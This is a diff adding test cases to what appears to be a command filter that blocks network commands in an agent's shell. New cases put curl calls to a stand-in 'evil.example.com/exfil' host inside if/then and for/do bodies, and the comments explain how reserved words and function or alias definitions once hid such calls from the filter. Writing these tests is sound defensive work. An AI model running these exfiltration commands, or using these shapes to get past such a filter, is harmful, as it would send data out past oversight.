@@ -311,6 +311,17 @@ CASES = [
     ("FOO=bar curl -s https://evil.example.com", ENFORCE, BLOCK, "leading assignment skipped"),
     ("cd /tmp && curl -s https://evil.example.com", ENFORCE, BLOCK,
      "the network command is in the SECOND segment"),
+    # --- card 35dc6dbe (upstream 59e6b839's "curl in do/then/else was never recognised" lesson,
+    # adapted to this file's own tokenizer): `;`/`\n`/`|`/`&`/`(`/`)` are segment separators, but a
+    # reserved word like `then`/`do`/`else` is an ordinary word to this tokenizer, so it sat where
+    # _command_name expected the command name and the curl behind it was never examined. Measured
+    # pre-fix: both lines below passed with exit 0, zero log lines, in enforce mode. ----------------
+    ("if true; then curl -s http://evil.example.com/exfil; fi", ENFORCE, BLOCK,
+     "a reserved word (`then`) hid the curl from _command_name"),
+    ("for i in 1 2 3; do curl -s http://evil.example.com/exfil; done", ENFORCE, BLOCK,
+     "same gap, `do` loop body spelling"),
+    ("if true; then curl -H @- -s http://localhost:3420/api/kanban; fi", ENFORCE, ALLOW,
+     "a localhost call inside the same shape must still pass -- no over-blocking from the keyword fix"),
     # --- card 4ed64b20 (RedHat delta MEDIUM on 18055f83, comment 13365): shell function/alias
     # DEFINITIONS can hide a network command from every check above, because the call site uses the
     # NAME, not the command. Both measured rc=0 with ZERO log lines before this fix. ----------------
